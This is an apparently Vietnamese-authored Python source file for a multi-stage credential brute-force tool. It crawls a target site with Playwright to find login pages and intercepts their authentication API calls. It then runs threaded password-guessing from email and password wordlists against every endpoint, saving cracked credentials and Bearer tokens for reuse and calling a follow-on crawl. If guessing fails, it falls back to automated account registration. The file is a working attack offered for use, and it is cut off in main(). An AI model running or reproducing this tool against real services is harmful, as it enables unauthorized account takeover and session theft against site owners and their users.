#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Smart Auto Login v2 - Multi-Endpoint + Auto Fallback
- Brute-force trên TẤT CẢ endpoints tìm được
- Lưu bruteforce_success.txt (username:password:endpoint)
- Lưu session_cookies.json (Bearer token)
- Auto fallback: gọi smart_register.py nếu brute-force thất bại

Install:
    pip install playwright requests --break-system-packages
    playwright install chromium
"""

import asyncio
import json
import argparse
import sys
import time
import subprocess
import os
import re
from datetime import datetime
from typing import Optional, Dict, List, Tuple
from pathlib import Path

# ── Playwright ────────────────────────────────────────────────────────────────
try:
    from playwright.async_api import async_playwright, Page, BrowserContext, Request
except ImportError:
    print("[ERROR] Playwright not installed.")
    print("  pip install playwright requests --break-system-packages")
    print("  playwright install chromium")
    sys.exit(1)

# ══════════════════════════════════════════════════════════════════════════════
#  LOGGER
# ══════════════════════════════════════════════════════════════════════════════
LOG_FILE = "attack.log"

def log(message: str, level: str = "INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{timestamp}] [{level}] {message}"
    print(entry); sys.stdout.flush()
    with open(LOG_FILE, "a") as f:
        f.write(entry + "\n")

# ══════════════════════════════════════════════════════════════════════════════
#  GLOBAL MODAL WATCHDOG - Auto-close modal khi script treo
# ══════════════════════════════════════════════════════════════════════════════
async def _try_close_modal_global(page: Page):
    """Global helper to close modal/notification - work everywhere"""
    try:
        # Step 1: Escape key
        await page.keyboard.press('Escape')
        await asyncio.sleep(0.3)
    except:
        pass
    
    # Step 2: CSS-based selectors for common patterns
    try:
        css_patterns = [
            "[id*='close'], [id*='dismiss'], [id*='cancel']",
            "[class*='close-btn'], [class*='dismiss-btn'], [class*='cancel-btn']",
            "[class*='modal-close'], [class*='modal-dismiss'], [class*='modal-cancel']",
            ".close, .dismiss, .cancel, .overlay-close",
            "[aria-label*='close' i], [aria-label*='dismiss' i], [aria-label*='cancel' i]",
            "button.btn-close, button.close-button, button.exit-button",
        ]
        
        for pattern in css_patterns:
            try:
                elements = await page.query_selector_all(pattern)
                for el in elements:
                    if await el.is_visible():
                        log(f"  [WATCHDOG] Closing modal via CSS: {pattern[:40]}", "INFO")
                        await el.click(timeout=2000)
                        await asyncio.sleep(0.3)
                        return
            except:
                continue
    except:
        pass
    
    # Step 3: JavaScript-based button text matching
    try:
        dismiss_keywords = [
            "dismiss", "close", "cancel", "skip", "no", "ok", "confirm",
            "continue", "next", "got it", "understood", "agree", "accept",
            "later", "maybe later", "ignore", "decline", "refuse",
            "thanks", "no thanks", "done", "x", "exit",
        ]
        
        find_and_click_js = f"""
        (function() {{
            const keywords = {json.dumps(dismiss_keywords)};
            const pattern = new RegExp(keywords.join('|'), 'i');
            const buttons = document.querySelectorAll('button, [role="button"], input[type="button"]');
            for (const btn of buttons) {{
                const text = btn.innerText || btn.textContent || btn.value || '';
                if (pattern.test(text.trim())) {{
                    if (btn.offsetParent !== null) {{
                        btn.click();
                        return true;
                    }}
                }}
            }}
            return false;
        }})()
        """
        
        result = await page.evaluate(find_and_click_js)
        if result:
            log(f"  [WATCHDOG] Closing modal via JavaScript", "INFO")
            await asyncio.sleep(0.3)
            return
    except:
        pass
    
    # Step 4: Fallback - Click at viewport center
    try:
        viewport = page.viewport_size
        if viewport:
            x = viewport['width'] // 6 * 5
            y = viewport['height'] // 4 * 3
            log(f"  [WATCHDOG] Fallback click at ({x}, {y})", "INFO")
            await page.mouse.click(x, y)
            await asyncio.sleep(0.3)
    except:
        pass

async def _wait_with_modal_timeout(operation_coro, timeout: int = 10, page: Optional[Page] = None, retry: bool = True):
    """
    Wrapper cho các operation có thể treo (page.goto, page.fill, v.v.)
    Nếu timeout, tự động gọi _try_close_modal và retry
    
    Args:
        operation_coro: async operation (awaitable)
        timeout: timeout in seconds (default 10)
        page: Page object (để gọi _try_close_modal)
        retry: retry sau khi close modal (default True)
    """
    try:
        result = await asyncio.wait_for(operation_coro, timeout=timeout)
        return result
    except asyncio.TimeoutError:
        if page:
            log(f"  [WATCHDOG] Operation timed out after {timeout}s, trying to close modal...", "WARN")
            await _try_close_modal_global(page)
            await asyncio.sleep(1)
            
            if retry:
                try:
                    log(f"  [WATCHDOG] Retrying operation...", "INFO")
                    result = await asyncio.wait_for(operation_coro, timeout=timeout)
                    return result
                except asyncio.TimeoutError:
                    log(f"  [WATCHDOG] Retry failed after modal close", "ERROR")
                    raise
        else:
            raise
    except Exception as e:
        raise

# ══════════════════════════════════════════════════════════════════════════════
#  PHASE 1: SMART LOGIN PAGE FINDER - MULTI-ENDPOINT
# ══════════════════════════════════════════════════════════════════════════════
class LoginPageFinder:
    """Tìm TẤT CẢ endpoints đăng nhập có thể"""
    
    CLICK_CANDIDATES = [
        "a:has-text('Đăng nhập')", "a:has-text('Đăng Nhập')", "a:has-text('ĐĂNG NHẬP')",
        "button:has-text('Đăng nhập')", "button:has-text('Đăng Nhập')",
        "a:has-text('Login')", "a:has-text('Sign in')", "a:has-text('Log in')",
        "button:has-text('Login')", "button:has-text('Sign in')",
        "a[href*='dang-nhap']", "a[href*='dangnhap']",
        "a[href*='login']", "a[href*='signin']", "a[href*='sign-in']",
        "a[href*='auth']", "a[href='/login']", "a[href='/signin']",
        "#login-button", "#btn-login", ".login-btn",
    ]
    
    FORM_DETECTOR = [
        "input[type='password']", "input[name='password']",
        "input[name='mat-khau']", "input[placeholder*='password' i]",
    ]

    def __init__(self, base_url: str, proxy: Optional[str] = None, headless: bool = True):
        self.base_url = base_url.rstrip("/").split('#')[0].rstrip('/')
        self.proxy = proxy
        self.headless = headless
        self.login_urls: List[str] = []  # TẤT CẢ URLs tìm được
        self.register_urls: List[str] = []  # Register endpoints từ login page
        self.form_fields: Dict[str, str] = {}
        self._captured_requests: List[Dict] = []

    async def _on_request(self, request: Request):
        url = request.url.lower()
        meth = request.method.upper()
        is_auth = any(k in url for k in [
            "login", "signin", "auth", "session", "token",
            "authenticate", "user", "dangnhap", "dang-nhap"
        ])
        if is_auth and meth in ("POST", "PUT"):
            self._captured_requests.append({
                "url": request.url,
                "method": meth,
                "body": request.post_data,
            })
            log(f"  ↳ Intercepted: {meth} {request.url}", "NET")

    async def _wait_stable(self, page: Page):
        try:
            await page.wait_for_load_state("networkidle", timeout=5000)
        except:
            await asyncio.sleep(1)

    async def _has_password(self, page: Page) -> bool:
        for sel in self.FORM_DETECTOR:
            try:
                if await page.query_selector(sel):
                    return True
            except:
                pass
        return False

    async def _extract_fields(self, page: Page) -> Dict[str, str]:
        fields = {}
        # Password
        for sel in self.FORM_DETECTOR:
            try:
                if await page.query_selector(sel):
                    fields[sel] = "password"
                    break
            except:
                pass
        
        # Email/Username
        email_sels = [
            "input[type='email']", "input[name*='email']", "input[name*='user']",
            "input[placeholder*='email' i]", "input[placeholder*='username' i]",
        ]
        for sel in email_sels:
            try:
                if await page.query_selector(sel):
                    fields[sel] = "email"
                    break
            except:
                pass
        
        # Submit
        submit_sels = [
            "button[type='submit']", "input[type='submit']",
            "button:has-text('Đăng nhập')", "button:has-text('Login')",
        ]
        for sel in submit_sels:
            try:
                if await page.query_selector(sel):
                    fields[sel] = "submit"
                    break
            except:
                pass
        
        return fields

    async def _find_login_elements_by_regex(self, page: Page) -> List:
        """Dùng regex tìm các element điều hướng (a, button) có href/id/class/text chứa 'login'"""
        results = []
        try:
            # Chỉ duyệt các element có thể click: link, button, element có role=button
            elements = await page.query_selector_all("a, button, input[type='button'], input[type='submit'], [role='button'], [role='link']")
            
            log(f"  [DEBUG] Found {len(elements)} clickable elements to scan for login", "INFO")
            
            for idx, el in enumerate(elements):
                try:
                    # Lấy thông tin element
                    el_href = await el.get_attribute("href") or ""
                    el_id = await el.get_attribute("id") or ""
                    el_class = await el.get_attribute("class") or ""
                    el_text = (await el.text_content() or "").strip()
                    el_label = await el.get_attribute("aria-label") or ""
                    is_visible = await el.is_visible()
                    
                    # Debug: log tất cả element có từ "login" hoặc gần tương tự
                    has_login_keyword = any(kw in (el_href + el_id + el_class + el_text + el_label).lower() 
                                           for kw in ["login", "sign", "auth"])
                    
                    if has_login_keyword:
                        log(f"    [ELEMENT {idx}] visible={is_visible}, href=\"{el_href[:50]}\", id=\"{el_id}\", aria-label=\"{el_label[:40]}\", text=\"{el_text[:40]}\"", "INFO")
                    
                    # ===== KIỂM TRA HREF =====
                    if el_href:
                        href_lower = el_href.lower()
                        if any(pattern in href_lower for pattern in ["#/login", "/#/login", "/login", "#login", "login"]):
                            # Thêm vào results dù visible hay không - sẽ cố gắng click
                            if is_visible:
                                log(f"    ✓ MATCH href (visible): {el_href}", "SUCCESS")
                                results.append((el, f"href={el_href}", True))
                            else:
                                log(f"    ⚠ MATCH href (NOT visible): {el_href} - sẽ thử click với force=True", "WARN")
                                results.append((el, f"href={el_href}", False))
                            continue
                    
                    # ===== KIỂM TRA ID =====
                    if el_id and re.search(r"login", el_id, re.IGNORECASE):
                        if is_visible:
                            log(f"    ✓ MATCH id (visible): {el_id}", "SUCCESS")
                            results.append((el, f"id={el_id}", True))
                        else:
                            log(f"    ⚠ MATCH id (NOT visible): {el_id}", "WARN")
                            results.append((el, f"id={el_id}", False))
                        continue
                    
                    # ===== KIỂM TRA CLASS =====
                    if el_class and re.search(r"login", el_class, re.IGNORECASE):
                        if is_visible:
                            log(f"    ✓ MATCH class (visible): {el_class}", "SUCCESS")
                            results.append((el, f"class={el_class}", True))
                        else:
                            log(f"    ⚠ MATCH class (NOT visible): {el_class}", "WARN")
                            results.append((el, f"class={el_class}", False))
                        continue
                    
                    # ===== KIỂM TRA TEXT =====
                    if el_text and re.search(r"login|đăng.?nhập", el_text, re.IGNORECASE):
                        if is_visible:
                            log(f"    ✓ MATCH text (visible): {el_text[:50]}", "SUCCESS")
                            results.append((el, f"text={el_text}", True))
                        else:
                            log(f"    ⚠ MATCH text (NOT visible): {el_text[:50]}", "WARN")
                            results.append((el, f"text={el_text}", False))
                        continue
                    
                    # ===== KIỂM TRA ARIA-LABEL =====
                    if el_label and re.search(r"login|đăng.?nhập", el_label, re.IGNORECASE):
                        if is_visible:
                            log(f"    ✓ MATCH aria-label (visible): {el_label}", "SUCCESS")
                            results.append((el, f"aria-label={el_label}", True))
                        else:
                            log(f"    ⚠ MATCH aria-label (NOT visible): {el_label}", "WARN")
                            results.append((el, f"aria-label={el_label}", False))
                
                except Exception as e:
                    log(f"    [ERROR] Element {idx} error: {e}", "ERROR")
            
            log(f"  [DEBUG] Regex found {len(results)} login elements (visible={sum(1 for _, _, v in results if v)}, not_visible={sum(1 for _, _, v in results if not v)})", "INFO")
            
        except Exception as e:
            log(f"  [ERROR] _find_login_elements_by_regex failed: {e}", "ERROR")
        
        return results

    async def _find_register_on_login_page(self, page: Page) -> Optional[str]:
        """Tìm endpoint đăng ký từ trang login hiện tại (dùng RegisterPageFinder logic)"""
        try:
            REGISTER_PATTERNS = [
                "#/register", "/#/register", "/register", "#register", "register",
                "#/signup", "/#/signup", "/signup", "#signup", "signup",
                "#/sign-up", "/#/sign-up", "/sign-up", "#sign-up", "sign-up",
                "#/dang-ky", "/#/dang-ky", "/dang-ky", "#dang-ky", "dang-ky",
            ]
            
            elements = await page.query_selector_all("a, button, input[type='button'], [role='button']")
            
            for el in elements:
                try:
                    el_href = await el.get_attribute("href") or ""
                    el_id = await el.get_attribute("id") or ""
                    el_class = await el.get_attribute("class") or ""
                    el_text = (await el.text_content() or "").strip()
                    
                    combined = f"{el_href} {el_id} {el_class} {el_text}".lower()
                    
                    for pattern in REGISTER_PATTERNS:
                        if pattern.lower() in combined:
                            # Found register element
                            if el_href:
                                if el_href.startswith("#"):
                                    register_url = self.base_url + el_href
                                else:
                                    register_url = el_href if el_href.startswith("http") else self.base_url + el_href
                                
                                log(f"  [+] Found register endpoint from login page: {register_url}")
                                return register_url
                            break
                except:
                    continue
        
        except Exception as e:
            log(f"  [DEBUG] _find_register_on_login_page: {e}", "DEBUG")
        
        return None

    async def find_all(self) -> bool:
        """Tìm TẤT CẢ login URLs có thể"""
        proxy_config = {"server": self.proxy} if self.proxy else None
        
        async with async_playwright() as pw:
            browser = await pw.chromium.launch(
                headless=self.headless,
                proxy=proxy_config,
                args=["--no-sandbox", "--disable-dev-shm-usage"]
            )
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
            )
            page = await context.new_page()
            page.on("request", self._on_request)
            
            log(f"Opening: {self.base_url}")
            try:
                # Use timeout wrapper - auto close modal if hangs
                await _wait_with_modal_timeout(
                    page.goto(self.base_url, timeout=30000),
                    timeout=10,
                    page=page,
                    retry=True
                )
            except Exception as e:
                log(f"Failed: {e}", "ERROR")
                await browser.close()
                return False
            
            await self._wait_stable(page)
            
            # Check homepage
            if await self._has_password(page):
                self.login_urls.append(page.url)
                self.form_fields = await self._extract_fields(page)
                log(f"  ✓ Login form on homepage")
                
                # Try to find register endpoint on this login page
                register_url = await self._find_register_on_login_page(page)
                if register_url and register_url not in self.register_urls:
                    self.register_urls.append(register_url)
            
            # Click các nút login (cách cũ)
            for selector in self.CLICK_CANDIDATES:
                try:
                    elements = await page.query_selector_all(selector)
                    for el in elements[:2]:
                        try:
                            if not await el.is_visible():
                                continue
                            
                            url_before = page.url
                            await el.click()
                            await asyncio.sleep(1.5)
                            
                            if await self._has_password(page):
                                if page.url not in self.login_urls:
                                    self.login_urls.append(page.url)
                                    log(f"  ✓ Found login URL: {page.url}")
                                if not self.form_fields:
                                    self.form_fields = await self._extract_fields(page)
                        except:
                            pass
                except:
                    pass
            
            # Regex-based search: Duyệt tất cả element có id/class/text khớp regex login
            login_elements = await self._find_login_elements_by_regex(page)
            for el, match_info, is_visible in login_elements:
                try:
                    log(f"  [*] Processing element: {match_info} (visible={is_visible})")
                    
                    # Thử extract href từ element để navigate trực tiếp
                    el_href = await el.get_attribute("href") or ""
                    if el_href:
                        # Nếu href là relative (#/login), resolve thành full URL
                        if el_href.startswith("#"):
                            # Lấy base URL từ page.url
                            base = page.url.split("#")[0].rstrip("/")
                            target_url = base + el_href
                        else:
                            target_url = el_href
                        
                        log(f"    → Navigating to: {target_url}")
                        try:
                            # Use timeout wrapper - auto close modal if hangs
                            await _wait_with_modal_timeout(
                                page.goto(target_url, timeout=30000),
                                timeout=10,
                                page=page,
                                retry=True
                            )
                        except:
                            # Fallback: thử click element nếu goto fail
                            try:
                                if not is_visible:
                                    await el.scroll_into_view()
                                    await asyncio.sleep(0.5)
                                await el.click(force=not is_visible)
                            except:
                                try:
                                    await el.focus()
                                    await page.keyboard.press('Enter')
                                except:
                                    pass
                    else:
                        # Không có href, thử click element
                        if not is_visible:
                            try:
                                await el.scroll_into_view()
                                await asyncio.sleep(0.5)
                            except:
                                pass
                        
                        try:
                            await el.click(force=not is_visible)
                        except:
                            try:
                                await el.focus()
                                await page.keyboard.press('Enter')
                            except:
                                pass
                    
                    await asyncio.sleep(2)  # Wait for SPA to render
                    await self._wait_stable(page)  # Wait for network to be idle
                    
                    if await self._has_password(page):
                        if page.url not in self.login_urls:
                            self.login_urls.append(page.url)
                            log(f"  ✓ Found login URL via regex: {page.url} ({match_info})")
                            
                            # Try to find register endpoint on this login page
                            register_url = await self._find_register_on_login_page(page)
                            if register_url and register_url not in self.register_urls:
                                self.register_urls.append(register_url)
                        
                        if not self.form_fields:
                            self.form_fields = await self._extract_fields(page)
                    else:
                        log(f"  [!] After {match_info}, no password field found on {page.url}")
                except Exception as e:
                    log(f"  [ERROR] Failed to process {match_info}: {e}", "ERROR")
            
            # URL guessing
            guesses = [
                "/dang-nhap", "/dangnhap", "/login", "/signin", "/sign-in",
                "/auth/login", "/user/login", "/account/login",
            ]
            for path in guesses:
                url = self.base_url + path
                try:
                    # Use timeout wrapper - auto close modal if hangs
                    await _wait_with_modal_timeout(
                        page.goto(url, timeout=10000),
                        timeout=10,
                        page=page,
                        retry=True
                    )
                    await self._wait_stable(page)
                    if await self._has_password(page):
                        if url not in self.login_urls:
                            self.login_urls.append(url)
                            log(f"  ✓ Found via guess: {url}")
                        if not self.form_fields:
                            self.form_fields = await self._extract_fields(page)
                except:
                    pass
            
            await browser.close()
        
        return len(self.login_urls) > 0

# ══════════════════════════════════════════════════════════════════════════════
#  PHASE 2: MULTI-ENDPOINT API INTERCEPTOR
# ══════════════════════════════════════════════════════════════════════════════
class MultiEndpointInterceptor:
    """Intercept endpoints cho TẤT CẢ login URLs"""
    
    def __init__(self, finder: LoginPageFinder, proxy: Optional[str] = None, headless: bool = True):
        self.finder = finder
        self.proxy = proxy
        self.headless = headless
        self.endpoints: List[Dict] = []  # Nhiều endpoints

    def _normalize_url(self, url: str) -> str:
        """Loại bỏ fragment (#...) khỏi URL để endpoint không bị sai"""
        if '#' in url:
            url = url.split('#')[0]
        return url.rstrip('/')

    async def intercept_all(self) -> bool:
        """Intercept TẤT CẢ endpoints"""
        for login_url in self.finder.login_urls:
            endpoint = await self._intercept_one(login_url)
            if endpoint:
                self.endpoints.append(endpoint)
        
        return len(self.endpoints) > 0

    async def _intercept_one(self, login_url: str) -> Optional[Dict]:
        proxy_config = {"server": self.proxy} if self.proxy else None
        
        async with async_playwright() as pw:
            browser = await pw.chromium.launch(
                headless=self.headless,
                proxy=proxy_config,
                args=["--no-sandbox", "--disable-dev-shm-usage"]
            )
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
            )
            page = await context.new_page()
            
            captured = []
            
            async def on_req(req: Request):
                url = req.url
                meth = req.method.upper()
                if any(k in url.lower() for k in ["login","auth","session","user","token"]) \
                   and meth in ("POST","PUT") \
                   and not any(s in url for s in [".js",".css",".png","socket.io"]):
                    captured.append({"url": url, "method": meth, "body": req.post_data or ""})
            
            page.on("request", on_req)
            
            # Use timeout wrapper for initial page load
            await _wait_with_modal_timeout(
                page.goto(login_url, timeout=30000),
                timeout=10,
                page=page,
                retry=True
            )
            await asyncio.sleep(1)
            
            # Try to close any modal/notification that might block interaction
            log(f"  [*] Attempting to close any blocking modals...", "INFO")
            await _try_close_modal_global(page)
            await asyncio.sleep(1)
            
            # Fill form with timeout protection
            fields = self.finder.form_fields
            test_email = "test@test.com"
            test_pass = "wrongpass123!"
            
            for sel, role in fields.items():
                try:
                    if role == "email":
                        await _wait_with_modal_timeout(
                            page.fill(sel, test_email),
                            timeout=5,
                            page=page,
                            retry=False
                        )
                    elif role == "password":
                        await _wait_with_modal_timeout(
                            page.fill(sel, test_pass),
                            timeout=5,
                            page=page,
                            retry=False
                        )
                    elif role == "submit":
                        await _wait_with_modal_timeout(
                            page.click(sel),
                            timeout=5,
                            page=page,
                            retry=False
                        )
                except:
                    pass
            
            await asyncio.sleep(2)
            await browser.close()
            
            if captured:
                best = captured[-1]
                body_str = best["body"]
                
                email_key = "email"
                pass_key = "password"
                
                if body_str:
                    try:
                        parsed = json.loads(body_str)
                        for k in parsed:
                            v = str(parsed[k])
                            if test_email in v:
                                email_key = k
                            if test_pass in v:
                                pass_key = k
                    except:
                        pass
                
                return {
                    "login_url": login_url,
                    "api_url": best["url"],
                    "method": best["method"],
                    "email_key": email_key,
                    "pass_key": pass_key,
                    "is_json": body_str.strip().startswith("{"),
                    "extra_fields": {}
                }
            
            return None

# ══════════════════════════════════════════════════════════════════════════════
#  PHASE 3: MULTI-ENDPOINT BRUTE-FORCER
# ══════════════════════════════════════════════════════════════════════════════
class MultiEndpointBruteForcer:
    """Brute-force trên TẤT CẢ endpoints"""
    
    SUCCESS_KEYS = ["token", "access_token", "jwt", "auth", "authentication", "session", "user", "data", "success"]
    FAILURE_KEYS = ["invalid", "incorrect", "wrong", "failed", "denied", "unauthorized", "error", "sai", "lỗi"]

    def __init__(self, endpoints: List[Dict], proxies: Optional[Dict] = None, delay: float = 0.3, threads: int = 5):
        import requests
        self.endpoints = endpoints
        self.proxies = proxies
        self.delay = delay
        self.threads = threads
        self.results = []  # [{email, password, endpoint, token}]

    def _build_payload(self, endpoint: Dict, email: str, password: str):
        payload = dict(endpoint.get("extra_fields", {}))
        payload[endpoint["email_key"]] = email
        payload[endpoint["pass_key"]] = password
        return payload

    def _is_success(self, status: int, text: str, json_data: Optional[dict]) -> Tuple[bool, str, str]:
        token = ""
        
        if status == 401:
            return False, "401 Unauthorized", ""
        
        if status in (200, 201):
            if json_data:
                # Extract token
                for k in self.SUCCESS_KEYS:
                    if k in json_data:
                        val = json_data[k]
                        if isinstance(val, str):
                            token = val
                        elif isinstance(val, dict):
                            for kk in ["token", "access_token", "jwt"]:
                                if kk in val:
                                    token = val[kk]
                                    break
                        if token:
                            break
                
                json_lower = str(json_data).lower()
                if any(k in json_data for k in self.SUCCESS_KEYS):
                    return True, "Success", token
                if any(k in json_lower for k in self.FAILURE_KEYS):
                    return False, "Failure", ""
                return True, "Status 200", token
        
        return False, f"Status {status}", ""

    def _try_one_endpoint(self, endpoint: Dict, email: str, password: str):
        import requests
        time.sleep(self.delay)
        
        payload = self._build_payload(endpoint, email, password)
        
        try:
            session = requests.Session()
            session.headers.update({
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                "Accept": "application/json",
                "Content-Type": "application/json" if endpoint["is_json"] else "application/x-www-form-urlencoded"
            })
            
            if endpoint["is_json"]:
                resp = session.request(endpoint["method"], endpoint["api_url"], json=payload, proxies=self.proxies, timeout=10)
            else:
                resp = session.request(endpoint["method"], endpoint["api_url"], data=payload, proxies=self.proxies, timeout=10)
            
            json_data = None
            try:
                json_data = resp.json()
            except:
                pass
            
            success, reason, token = self._is_success(resp.status_code, resp.text, json_data)
            return success, reason, token
        
        except Exception as e:
            return False, str(e), ""

    def run(self, emails: List[str], passwords: List[str]):
        """Brute-force trên TẤT CẢ endpoints cho TẤT CẢ emails"""
        from concurrent.futures import ThreadPoolExecutor, as_completed
        
        log(f"[*] Brute-forcing {len(emails)} email(s) × {len(passwords)} password(s) × {len(self.endpoints)} endpoint(s)")
        log(f"[*] Total attempts: {len(emails) * len(passwords) * len(self.endpoints)}")
        
        for email in emails:
            email_found_on = []  # Track endpoints where this email succeeded
            
            for endpoint in self.endpoints:
                log(f"\n[*] Testing {email} on: {endpoint['api_url']}")
                
                found_password = None
                found_token = None
                
                def worker(pwd):
                    return pwd, *self._try_one_endpoint(endpoint, email, pwd)
                
                with ThreadPoolExecutor(max_workers=self.threads) as ex:
                    futures = {ex.submit(worker, p): p for p in passwords}
                    done = 0
                    
                    for future in as_completed(futures):
                        pwd, success, reason, token = future.result()
                        done += 1
                        
                        if done % 20 == 0:
                            log(f"  Progress: {done}/{len(passwords)}")
                        
                        if success:
                            log(f"✓ FOUND: {email}:{pwd} @ {endpoint['api_url']}", "SUCCESS")
                            if token:
                                log(f"  Token: {token[:50]}...", "SUCCESS")
                            
                            found_password = pwd
                            found_token = token
                            
                            # Cancel remaining attempts for THIS endpoint
                            for f in futures:
                                f.cancel()
                            break
                
                # Lưu kết quả cho endpoint này
                if found_password:
                    self.results.append({
                        "email": email,
                        "password": found_password,
                        "endpoint": endpoint["api_url"],
                        "login_url": endpoint["login_url"],
                        "token": found_token or "",
                    })
                    email_found_on.append(endpoint['api_url'])
            
            # Summary cho email này
            if email_found_on:
                log(f"\n[✓] {email} succeeded on {len(email_found_on)} endpoint(s)", "SUCCESS")
            else:
                log(f"\n[✗] {email} failed on all endpoints", "WARN")

    def save_bruteforce_success(self, path: str = "bruteforce_success.txt"):
        """Lưu: username:password:endpoint"""
        if not self.results:
            return
        
        with open(path, "w") as f:
            for r in self.results:
                line = f"{r['email']}:{r['password']}:{r['endpoint']}\n"
                f.write(line)
        
        log(f"Bruteforce success saved → {path}", "SUCCESS")

    def save_session(self, path: str = "session_cookies.json"):
        """Lưu TẤT CẢ sessions thành MẢNG"""
        if not self.results:
            return
        
        sessions = []
        for r in self.results:
            sessions.append({
                "email": r["email"],
                "password": r["password"],
                "endpoint": r["endpoint"],
                "login_url": r["login_url"],
                "token": r["token"],
                "timestamp": datetime.now().isoformat(),
                "cookies": {"token": r["token"]} if r["token"] else {},
                "headers": {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                    "Authorization": f"Bearer {r['token']}" if r["token"] else ""
                },
                "cookie_string": f"token={r['token']}" if r["token"] else "",
            })
        
        # Lưu thành mảng
        data = {
            "base_url": self.endpoints[0]["login_url"].split("/login")[0].split("/dang-nhap")[0],
            "total_sessions": len(sessions),
            "sessions": sessions
        }
        
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
        
        log(f"Session array saved → {path} ({len(sessions)} session(s))", "SUCCESS")

# ══════════════════════════════════════════════════════════════════════════════
#  AUTO FALLBACK TO REGISTER
# ══════════════════════════════════════════════════════════════════════════════
def call_smart_register(url: str, proxy: Optional[str] = None, visible: bool = False, register_url: Optional[str] = None, login_url: Optional[str] = None):
    """Gọi smart_register.py nếu brute-force thất bại"""
    log("\n" + "="*70)
    log("BRUTE-FORCE FAILED → AUTO FALLBACK TO REGISTRATION")
    log("="*70)
    
    script_dir = os.path.dirname(os.path.abspath(__file__))
    register_script = os.path.join(script_dir, "smart_register.py")
    
    if not os.path.exists(register_script):
        log(f"smart_register.py not found at: {register_script}", "ERROR")
        return False
    
    cmd = [sys.executable, register_script, "-u", url]
    if proxy:
        cmd.extend(["--proxy", proxy])
    if visible:
        cmd.append("--visible")
    if register_url:
        cmd.extend(["--register-url", register_url])
    if login_url:
        cmd.extend(["--login-url", login_url])
    
    log(f"Running: {' '.join(cmd)}")
    
    try:
        result = subprocess.run(cmd, check=True, capture_output=False)
        return result.returncode == 0
    except subprocess.CalledProcessError as e:
        log(f"smart_register.py failed: {e}", "ERROR")
        return False
    except Exception as e:
        log(f"Error calling smart_register.py: {e}", "ERROR")
        return False

# ══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════════════
async def async_main(args):
    global LOG_FILE
    LOG_FILE = args.log_file
    
    with open(LOG_FILE, "w") as f:
        f.write(f"=== Smart Login v2 - Multi-Endpoint: {datetime.now().isoformat()} ===\n")
    
    proxy = args.proxy or None
    proxies = {"http": proxy, "https": proxy} if proxy else None
    
    def load_file(path):
        try:
            with open(path, encoding="utf-8", errors="ignore") as f:
                return [l.strip() for l in f if l.strip()]
        except Exception as e:
            log(f"Cannot read {path}: {e}", "ERROR")
            return []
    
    emails = [args.username] if args.username else load_file(args.userlist or "")
    passwords_raw = load_file(args.wordlist) if args.wordlist else []
    
    if not emails and not args.detect_only:
        log("No emails provided", "ERROR")
        return
    if not passwords_raw and not args.detect_only:
        log("No wordlist provided", "ERROR")
        return
    
    # Limit 1000 attempts
    MAX_ATTEMPTS = 1000
    ppw = max(5, MAX_ATTEMPTS // max(len(emails), 1))
    if ppw < len(passwords_raw):
        passwords = passwords_raw[:ppw]
        log(f"Wordlist limited to {len(passwords)} (from {len(passwords_raw)})")
    else:
        passwords = passwords_raw
    
    # PHASE 1: Find ALL login URLs
    log("="*70)
    log("PHASE 1: Finding ALL login URLs")
    log("="*70)
    
    finder = LoginPageFinder(args.url, proxy=proxy, headless=not args.visible)
    found = await finder.find_all()
    
    if not found:
        log("Could not find any login page", "ERROR")
        return
    
    log(f"\n✓ Found {len(finder.login_urls)} login URL(s):")
    for url in finder.login_urls:
        log(f"  - {url}")
    
    if args.detect_only:
        log("\n--detect-only: stopping here")
        return
    
    # PHASE 2: Intercept ALL endpoints
    log("\n" + "="*70)
    log("PHASE 2: Intercepting ALL API endpoints")
    log("="*70)
    
    interceptor = MultiEndpointInterceptor(finder, proxy=proxy, headless=not args.visible)
    intercepted = await interceptor.intercept_all()
    
    if not intercepted:
        log("No API endpoints intercepted", "ERROR")
        return
    
    log(f"\n✓ Intercepted {len(interceptor.endpoints)} endpoint(s):")
    for ep in interceptor.endpoints:
        log(f"  - {ep['method']} {ep['api_url']}")
        log(f"    Keys: {ep['email_key']}, {ep['pass_key']}")
    
    # PHASE 3: Brute-force ALL endpoints
    log("\n" + "="*70)
    log("PHASE 3: Brute-force on ALL endpoints")
    log("="*70)
    
    bruteforcer = MultiEndpointBruteForcer(
        interceptor.endpoints,
        proxies=proxies,
        delay=args.delay,
        threads=args.threads
    )
    bruteforcer.run(emails, passwords)
    
    # Results
    log("\n" + "="*70)
    if bruteforcer.results:
        log(f"✓ SUCCESS: {len(bruteforcer.results)} account(s) compromised", "SUCCESS")
        log("="*70)
        
        bruteforcer.save_bruteforce_success("bruteforce_success.txt")
        bruteforcer.save_session("session_cookies.json")
        
        log(f"\n[+] Output files:")
        log(f"    - bruteforce_success.txt ({len(bruteforcer.results)} credentials)")
        log(f"    - session_cookies.json ({len(bruteforcer.results)} sessions)")
        
        log("\n[*] Next step - Run deep_crawl (will loop through ALL sessions):")
        log(f"    ./deep_crawl_v3.sh {args.url} session_cookies.json")
        
    else:
        log("✗ BRUTE-FORCE FAILED: No credentials found", "WARN")
        log("="*70)
        
        if not args.no_register:
            # Use first register URL from login page if found, otherwise None
            register_url = finder.register_urls[0] if finder.register_urls else None
            # Use first login URL for auto-login after registration
            login_url = finder.login_urls[0] if finder.login_urls else None
            
            success = call_smart_register(args.url, proxy=proxy, visible=args.visible, register_url=register_url, login_url=login_url)
            
            if success:
                log("\n[+] Registration successful!")
                log("[+] Session saved to: session_cookies.json")
                log("\n[*] Next step - Run deep_crawl:")
                log(f"    ./deep_crawl_v3.sh {args.url} session_cookies.json")
            else:
                log("\n[!] Registration also failed", "ERROR")
        else:
            log("\n[!] Auto-registration disabled (--no-register)")
            log("[!] Cannot proceed without valid session")

def main():
    p = argparse.ArgumentParser(
        description="Smart Auto Login v2 - Multi-Endpoint + Auto Fallback"
    )
    p.add_argument("-u", "--url", required=True, help="Target URL")
